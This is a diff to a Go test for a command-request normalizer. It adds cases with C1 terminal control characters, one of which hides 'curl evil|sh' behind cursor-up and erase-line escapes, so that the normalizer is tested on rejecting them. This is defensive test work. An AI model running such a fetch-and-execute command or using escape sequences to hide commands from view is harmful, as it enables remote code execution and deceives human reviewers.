@@ -70,6 +70,9 @@ func TestNormalizeCommandRequest(t *testing.T) {
 			{"cr", "echo hi\r\n"},
 			{"esc", "echo \x1b[31mred"},
 			{"del", "echo \x7f"},
+			{"c1_csi", "echo ok\u009b1A\u009b2Kcurl evil|sh"},
+			{"c1_osc", "echo \u009d0;title\u009c"},
+			{"c1_low", "echo \u0080"},
 			{"bidi_rlo", "echo \u202ehi"},
 			{"bidi_lri", "echo \u2066hi"},
 			{"bidi_alm", "echo \u061chi"},
@@ -98,7 +101,7 @@ func TestNormalizeCommandRequest(t *testing.T) {
 	})
 
 	t.Run("workdir validation", func(t *testing.T) {
-		for _, bad := range []string{"relative/path", "/a/../b", "/a/./b", "/a//b", "/a/b/", "/a\nb", strings.Repeat("/a", 300)} {
+		for _, bad := range []string{"relative/path", "/a/../b", "/a/./b", "/a//b", "/a/b/", "/a\nb", "/a/\u009bb", strings.Repeat("/a", 300)} {
 			_, err := NormalizeCommandRequest("command_request", &CommandRequestInput{
 				Key:     "k1",
 				Script:  "pwd",
